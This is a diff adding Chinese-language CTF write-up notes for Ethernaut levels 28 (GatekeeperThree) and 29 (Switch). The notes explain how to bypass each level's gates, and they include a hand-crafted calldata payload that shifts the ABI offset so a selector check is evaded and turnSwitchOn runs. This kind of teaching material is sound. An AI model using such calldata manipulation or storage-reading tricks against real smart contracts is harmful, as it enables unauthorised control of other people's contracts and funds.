@@ -171,3 +171,29 @@ contract ReentranceAttact {
 }
 ```
 [参考](https://ethereum.stackexchange.com/questions/119737/recreating-a-re-entrancy-attack-but-transaction-failed-reverted-why)
+
+
+## [28 - GatekeeperThree](https://ethernaut.openzeppelin.com/level/0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882)
+`gateOne`: EOA调用合约调用`GatekeeperThree.enter`
+`gateTwo`: 设置`allowEntrance`, `trick.password`可通过`getStorageAt`获取
+`gateThree`: 通过`construct0r`设置owner，owner是合约，不包含`receive`或者`fallback`函数，send就会失败，返回false
+
+## [29 - Switch](https://ethernaut.openzeppelin.com/level/0xb2aBa0e156C905a9FAEc24805a009d99193E3E53)
+Switch.sol中`calldatacopy`和`address(this).call(_data)`使用的数据并不相同，函数的`calldata`包含`function selector` + `encode parameter data`, 而`_data`是解析之后的`parameter`.
+拷贝68的起始位置， 拷贝 4bytes，正好是`_data`中代表`function selector`的数据, 要求数据为`offSelector`, 但为了达到目标，我们call需要真实调用`turnSwitchOn`，解决这个问题，需要假造`calldata`数据如下
+```bash
+    // _data is "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
+    
+    --> function flipSwitch selector
+    30c13ade
+    --> offset, now = 96-bytes
+    0000000000000000000000000000000000000000000000000000000000000060
+    --> extra bytes
+    0000000000000000000000000000000000000000000000000000000000000000
+    --> Offset 68 (where the check occurs)
+    20606e1500000000000000000000000000000000000000000000000000000000
+    --> length 4 bytes 
+    0000000000000000000000000000000000000000000000000000000000000004
+    --> Data (function turnSwitchOn signature)
+    76227e1200000000000000000000000000000000000000000000000000000000
+```
